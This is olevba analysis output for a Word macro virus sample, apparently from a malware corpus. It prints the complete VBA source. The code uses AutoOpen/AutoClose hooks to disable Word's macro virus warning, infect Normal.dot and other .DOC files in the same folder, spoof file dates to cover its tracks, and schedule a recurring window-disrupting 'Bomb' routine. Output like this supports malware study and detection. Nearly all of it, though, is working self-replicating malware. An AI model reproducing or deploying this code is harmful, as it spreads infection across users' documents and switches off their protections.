olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Model.e-92f35ff8000acc5df877e3e38b594a936602f0fe
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Model.e-92f35ff8000acc5df877e3e38b594a936602f0fe - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Code.bas 
in file: Virus.MSWord.Model.e-92f35ff8000acc5df877e3e38b594a936602f0fe - OLE stream: 'Macros/VBA/Code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoNew()
    CopyVirCode
End Sub
Sub AutoOpen()
    CopyVirCode
End Sub
Sub AutoExec()
    CopyVirCode
End Sub
Sub AutoClose()
    CopyVirCode
End Sub
Sub AutoExit()
    CopyVirCode
End Sub
Private Sub CopyVirCode()
    On Local Error Resume Next
    RemoveProtection
    If Not ActiveDocument = NormalTemplate Then 'Infetta Normal.dot
        CopyVirCodeToModel
    End If
    If Not ActiveDocument = ThisDocument Then   'Infetta il documento aperto
        CopyVirCodeToDocument ActiveDocument
    End If
End Sub
Private Sub CopyVirCodeToModel()
    On Local Error Resume Next
    oldDate = Date
    Date = FileDateTime(FileName)
    With ActiveDocument
        .UpdateStylesOnOpen = False
        .AttachedTemplate = "Normal.dot"
    End With
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Code", Object:=wdOrganizerObjectProjectItems
    NormalTemplate.Save
    Date = oldDate
End Sub
Private Sub CopyVirCodeToDocument(Target As Document)
    On Local Error Resume Next
    Set fs = Application.FileSearch
    With fs
     .LookIn = Target.Path
     .FileName = "*.DOC"
     If .Execute(SortBy:=msoSortByFileName, SortOrder:=msoSortOrderAscending) > 0 Then
      Randomize
      FileName = .FoundFiles(Int((.FoundFiles.Count * Rnd) + 1))
      oldDate = Date
      Date = FileDateTime(FileName)
      Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=FileName, Name:="Code", Object:=wdOrganizerObjectProjectItems
      Date = oldDate
     Else
       Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=Target.FullName, Name:="Code", Object:=wdOrganizerObjectProjectItems
     End If
    End With
    Application.OnTime When:=Now + TimeValue("04:00:00"), Name:="Normal.Code.Bomb"
End Sub
Private Sub RemoveProtection()
    'Disattiva il messaggio di avviso iniziale
    Options.VirusProtection = False
End Sub
Private Sub Bomb()
    On Local Error Resume Next
    For Each myTask In Tasks
     oldWindowState = ActiveWindow.WindowState
    
     myTask.WindowState = wdWindowStateMinimize
     myTask.WindowState = wdWindowStateMaximize
     myTask.WindowState = oldWindowState
    Next myTask
    Application.OnTime When:=Now + TimeValue("01:00:00"), Name:="Normal.Code.Bomb"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

